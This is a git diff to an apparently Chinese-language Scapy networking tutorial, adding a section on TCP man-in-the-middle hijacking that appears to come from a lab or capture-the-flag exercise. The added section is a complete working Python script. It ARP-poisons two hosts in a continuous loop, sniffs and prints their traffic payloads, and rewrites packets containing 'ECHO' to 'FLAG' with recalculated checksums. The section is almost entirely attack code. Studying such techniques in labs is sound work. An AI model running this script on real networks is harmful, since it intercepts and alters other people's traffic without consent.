@@ -31,6 +31,7 @@ comments: true
   - [4.4 TCP三次握手](#44-tcp三次握手)
   - [4.5 发送ARP报文](#45-发送arp报文)
   - [4.6 arp欺骗](#46-arp欺骗)
+  - [4.6 tcp中间人劫持](#46-tcp中间人劫持)
 
 
 ## 前言<br>
@@ -479,4 +480,62 @@ sendp(packet,iface="eth0")
 ```
 ip addr add 10.0.0.2/24 dev eth0
 nc -l 31337
+```
+
+### 4.6 tcp中间人劫持<br>
+```python
+from scapy.all import *
+import threading
+import time
+import sys
+conf.verb= 0
+ip1= "10.0.0.3"	
+ip2= "10.0.0.4"
+def arp_poison(target_ip,spoof_ip):
+	arp=ARP(op="is-at",psrc=spoof_ip,pdst=target_ip)
+	ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+	packet= ether/arp
+	# packet.show()
+	sendp(packet,iface="eth0")
+
+def arp_spoof():
+	while True:
+		# print("start poisioning...")
+		arp_poison(ip1,ip2)
+		arp_poison(ip2,ip1)
+		time.sleep(2)
+
+def process_packet(packet):
+	if IP in packet:
+		ip_src = packet[IP].src
+		ip_dst = packet[IP].dst
+		if ip_src== ip1 and ip_dst == ip2:
+			#print("{ip1} to {ip2}")
+			if packet.haslayer(Raw):
+				data = packet[Raw].load
+				print(data)
+			send(packet,iface="eth0")
+		else :
+			if ip_src == ip2 and ip_dst ==ip1:
+				#print("{ip2} to {ip1}")
+				if packet.haslayer(Raw):
+					data = packet[Raw].load
+					print(data)
+					if b"ECHO" in data:
+						print("hit!!!!!!!!!!!!!!!!!----------------------++++++++++++++++++")
+						packet[Raw].load = b"FLAG\n"
+						del packet[IP].chksum
+						del packet[TCP].chksum
+						send(packet,iface="eth0")
+						print("send!")	
+						packet.show()
+				send(packet,iface="eth0")
+							
+	else:
+		send(packet,iface="eth0")
+
+arp_thread=threading.Thread(target=arp_spoof)
+arp_thread.start()
+
+sniff(prn=process_packet,iface="eth0")
 ```
